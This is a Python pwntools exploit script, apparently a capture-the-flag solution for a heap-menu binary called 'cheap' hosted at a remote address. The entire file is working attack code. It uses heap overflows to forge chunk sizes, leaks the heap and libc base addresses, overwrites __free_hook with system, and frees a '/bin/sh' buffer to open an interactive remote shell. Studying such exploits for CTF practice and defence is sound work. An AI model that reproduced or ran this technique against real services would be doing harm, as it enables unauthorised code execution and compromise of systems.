#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) == 1:
    s = process('./cheap')
else:
    s = remote('34.146.101.4', 30001)

def create(size, data='A\n'):
    s.sendlineafter('Choice: ', '1')
    s.sendlineafter('size: ', str(size))
    s.sendafter('data: ', data)

def show():
    s.sendlineafter('Choice: ', '2')
    return s.recvline(False)

def delete():
    s.sendlineafter('Choice: ', '3')

libc = ELF('./libc.so.6')

create(0xf8)
delete()
create(0x28)
delete()
create(0x38)
create(0x68)
delete()
create(0xf8, b'A' * 0xf8 + p64(0x71))
delete()
create(0x28)
delete()
create(0xf8, 'A' * 0x100)
heap_base = u64(show()[0x100:].ljust(8, b'\0')) - 0x410
log.info('heap base: %#x' % heap_base)

create(0x68)
create(0x68)

create(0xf8)
delete()
create(0x1f8)
delete()
create(0x2f8)

create(0x48)
delete()
create(0x18)
delete()
create(0x28)
delete()
create(0x38)
delete()
create(0x68)
delete()
create(0x18, b'A' * 0x18 + p64(0x71) + b'\n')
delete()
create(0x28)
delete()

create(0xf8, b'A' * 0xf8 + p64(0x501))
delete()
create(0x1f8)
delete()
create(0xf8, 'A' * 0x100)
libc.address = u64(show()[0x100:].ljust(8, b'\0')) - 0x1ebbe0
log.info('libc base: %#x' % libc.address)

create(0x18, b'A' * 0x18 + p64(0x31) + p64(libc.symbols['__free_hook']) + b'\n')
create(0x68)
create(0x68, p64(libc.symbols['system']) + b'\n')
create(0x48, '/bin/sh\n')
delete()

s.interactive()
